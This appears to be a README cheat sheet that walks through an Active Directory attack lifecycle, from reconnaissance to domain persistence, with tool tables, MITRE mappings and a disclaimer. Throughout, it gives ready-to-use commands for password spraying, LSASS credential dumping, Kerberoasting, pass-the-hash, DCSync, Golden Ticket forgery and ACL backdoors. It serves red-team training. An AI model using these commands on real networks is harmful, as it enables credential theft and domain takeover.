# 🏴 Active Directory Kill Chain

> A structured walkthrough of the Active Directory attack lifecycle — from initial reconnaissance to full domain compromise.

---

## 📋 Table of Contents

- [Overview](#overview)
- [Kill Chain Phases](#kill-chain-phases)
  - [Phase 1 — Reconnaissance](#phase-1--reconnaissance)
  - [Phase 2 — Initial Access](#phase-2--initial-access)
  - [Phase 3 — Local Privilege Escalation](#phase-3--local-privilege-escalation)
  - [Phase 4 — Credential Harvesting](#phase-4--credential-harvesting)
  - [Phase 5 — Lateral Movement](#phase-5--lateral-movement)
  - [Phase 6 — Domain Privilege Escalation](#phase-6--domain-privilege-escalation)
  - [Phase 7 — Domain Persistence](#phase-7--domain-persistence)
- [Tools Reference](#tools-reference)
- [Mitre ATT&CK Mapping](#mitre-attck-mapping)
- [Disclaimer](#disclaimer)

---

## Overview

The **Active Directory Kill Chain** describes the sequential stages an attacker follows to compromise a Windows domain environment. Each phase builds on the last — from initial foothold to complete domain dominance.

```
[Recon] → [Initial Access] → [Local PrivEsc] → [Credential Harvesting]
       → [Lateral Movement] → [Domain PrivEsc] → [Persistence]
```

This document is intended for **red teamers, penetration testers, and defenders** seeking to understand the full attack path in order to detect and disrupt it.

---

## Kill Chain Phases

---

### Phase 1 — Reconnaissance

**Goal:** Map the environment without triggering alerts.

#### External Recon
| Technique | Tool | Description |
|-----------|------|-------------|
| OSINT gathering | `theHarvester`, `recon-ng` | Collect emails, subdomains, employee names |
| DNS enumeration | `dnsx`, `subfinder` | Identify domain structure |
| LinkedIn profiling | Manual | Identify IT/AD admin usernames |

#### Internal Recon (post-foothold)
| Technique | Tool | Description |
|-----------|------|-------------|
| AD enumeration | `BloodHound`, `SharpHound` | Map AD objects, ACLs, attack paths |
| Network sweep | `nmap`, `netdiscover` | Identify live hosts and services |
| User/group enumeration | `net user /domain`, `ldapsearch` | List domain users, groups, OUs |
| Share enumeration | `crackmapexec smb --shares` | Find accessible SMB shares |

```bash
# BloodHound collection
SharpHound.exe -c All --outputdirectory C:\Temp

# CrackMapExec domain enumeration
crackmapexec smb <DC_IP> -u '' -p '' --users
```

---

### Phase 2 — Initial Access

**Goal:** Gain a foothold on a domain-joined machine.

| Vector | Technique | Notes |
|--------|-----------|-------|
| Phishing | Malicious macro / LNK | Most common entry point |
| Password spraying | `kerbrute`, `crackmapexec` | Avoid lockouts — 1 attempt per user |
| AS-REP Roasting | `GetNPUsers.py` | Targets accounts without Kerberos pre-auth |
| Valid credentials | Credential stuffing | From breached databases |
| Exposed services | RDP, WinRM brute force | Weak or default credentials |

```bash
# Password spraying with kerbrute
kerbrute passwordspray -d domain.local --dc <DC_IP> users.txt 'Password123!'

# AS-REP Roasting
python3 GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip <DC_IP>
```

---

### Phase 3 — Local Privilege Escalation

**Goal:** Elevate from standard user to local administrator.

| Technique | Tool | Description |
|-----------|------|-------------|
| Unquoted service paths | `winPEAS` | Hijack service binary paths |
| Weak service permissions | `accesschk.exe` | Modify service binaries |
| AlwaysInstallElevated | `winPEAS` | Abuse misconfigured MSI policy |
| Token impersonation | `PrintSpoofer`, `Juicy Potato` | Abuse `SeImpersonatePrivilege` |
| Kernel exploits | `wesng`, `windows-exploit-suggester` | Patch-gap exploitation |

```bash
# winPEAS automated enumeration
winpeas.exe

# PrintSpoofer token impersonation
PrintSpoofer.exe -i -c cmd
```

---

### Phase 4 — Credential Harvesting

**Goal:** Extract credentials to enable lateral movement and domain escalation.

| Technique | Tool | Credential Type |
|-----------|------|-----------------|
| LSASS dump | `Mimikatz`, `pypykatz` | Cleartext passwords, NTLM hashes |
| SAM database dump | `secretsdump.py` | Local account hashes |
| Kerberoasting | `GetUserSPNs.py`, `Rubeus` | Service account TGS tickets |
| NTDS.dit extraction | `secretsdump.py`, `ntdsutil` | All domain hashes |
| DPAPI secrets | `Mimikatz dpapi` | Browser passwords, certificates |

```bash
# Mimikatz — dump credentials from LSASS
sekurlsa::logonpasswords

# Kerberoasting
python3 GetUserSPNs.py domain.local/user:pass -dc-ip <DC_IP> -request

# Remote NTDS dump
secretsdump.py domain/Administrator@<DC_IP> -just-dc-ntlm
```

---

### Phase 5 — Lateral Movement

**Goal:** Move across the network to reach higher-value targets.

| Technique | Tool | Protocol |
|-----------|------|----------|
| Pass-the-Hash (PtH) | `crackmapexec`, `Mimikatz` | SMB / WMI |
| Pass-the-Ticket (PtT) | `Rubeus`, `Mimikatz` | Kerberos |
| WMI execution | `wmiexec.py` | WMI |
| WinRM / Evil-WinRM | `evil-winrm` | WinRM (5985) |
| RDP with stolen creds | `xfreerdp` | RDP (3389) |
| Overpass-the-Hash | `Rubeus asktgt` | Kerberos TGT from NTLM hash |

```bash
# Pass-the-Hash via CrackMapExec
crackmapexec smb <TARGET_IP> -u Administrator -H <NTLM_HASH> -x whoami

# Evil-WinRM with hash
evil-winrm -i <TARGET_IP> -u Administrator -H <NTLM_HASH>

# Overpass-the-Hash
Rubeus.exe asktgt /user:admin /rc4:<NTLM_HASH> /ptt
```

---

### Phase 6 — Domain Privilege Escalation

**Goal:** Escalate to Domain Admin or equivalent.

| Attack | Description | Tool |
|--------|-------------|------|
| **DCSync** | Replicate AD to pull all hashes | `Mimikatz`, `secretsdump.py` |
| **Kerberoasting** | Crack SPN service account TGS | `Rubeus`, `hashcat` |
| **Golden Ticket** | Forge TGTs using KRBTGT hash | `Mimikatz` |
| **Silver Ticket** | Forge TGS for specific service | `Mimikatz` |
| **ACL Abuse** | Exploit WriteDACL / GenericAll | `BloodHound`, `PowerView` |
| **GPO Abuse** | Modify Group Policy on OUs | `SharpGPOAbuse` |
| **ADCS ESC1** | Abuse misconfigured certificate templates | `Certipy` |

```bash
# DCSync attack
lsadump::dcsync /domain:domain.local /user:krbtgt

# Golden Ticket
kerberos::golden /user:Administrator /domain:domain.local /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt

# ADCS ESC1 exploitation
certipy req -u user@domain.local -p pass -ca 'CA-Name' -template 'VulnerableTemplate' -upn administrator@domain.local
```

---

### Phase 7 — Domain Persistence

**Goal:** Maintain long-term access that survives password resets.

| Technique | Description | Stealth |
|-----------|-------------|---------|
| **Golden Ticket** | KRBTGT-signed TGT valid for 10 years | ⚠️ Medium |
| **Silver Ticket** | Forge service tickets offline | ✅ High |
| **Skeleton Key** | Patch LSASS — any password works | ❌ Low |
| **AdminSDHolder ACL** | Backdoor protected group ACL | ✅ High |
| **DSRM Account** | Enable Directory Services Restore Mode login | ✅ High |
| **SID History Injection** | Add Domain Admin SID to user | ✅ High |
| **Shadow Credentials** | Add certificate credential to target account | ✅ High |

```bash
# AdminSDHolder persistence (PowerView)
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity lowprivuser -Rights All

# DSRM persistence
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```

---

## Tools Reference

| Tool | Category | Source |
|------|----------|--------|
| `BloodHound` / `SharpHound` | AD Enumeration | https://github.com/BloodHoundAD/BloodHound |
| `Mimikatz` | Credential Harvesting | https://github.com/gentilkiwi/mimikatz |
| `Impacket` (`secretsdump`, `wmiexec`) | Remote Exploitation | https://github.com/fortra/impacket |
| `CrackMapExec` | Lateral Movement | https://github.com/Porchetta-Industries/CrackMapExec |
| `Rubeus` | Kerberos Attacks | https://github.com/GhostPack/Rubeus |
| `Certipy` | ADCS Exploitation | https://github.com/ly4k/Certipy |
| `kerbrute` | Password Spraying | https://github.com/ropnop/kerbrute |
| `evil-winrm` | Remote Shell | https://github.com/Hackplayers/evil-winrm |
| `PowerView` | AD Enumeration | https://github.com/PowerShellMafia/PowerSploit |
| `winPEAS` | Local PrivEsc | https://github.com/carlospolop/PEASS-ng |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique ID |
|-------|--------|--------------|
| Reconnaissance | Reconnaissance | T1595, T1589 |
| Initial Access | Initial Access | T1566, T1110.003 |
| Local PrivEsc | Privilege Escalation | T1134, T1055 |
| Credential Harvesting | Credential Access | T1003.001, T1558.003 |
| Lateral Movement | Lateral Movement | T1550.002, T1021.006 |
| Domain PrivEsc | Privilege Escalation | T1484, T1649 |
| Persistence | Persistence | T1558.001, T1207 |

Full framework reference: [https://attack.mitre.org](https://attack.mitre.org)

---

## Disclaimer

> This repository is intended **strictly for educational purposes**, authorised penetration testing, and security research.  
> Performing these techniques against systems you do not own or have **explicit written permission** to test is **illegal** and punishable under computer crime laws including the CFAA, Computer Misuse Act, and equivalents worldwide.  
> The author assumes no liability for misuse of this material.
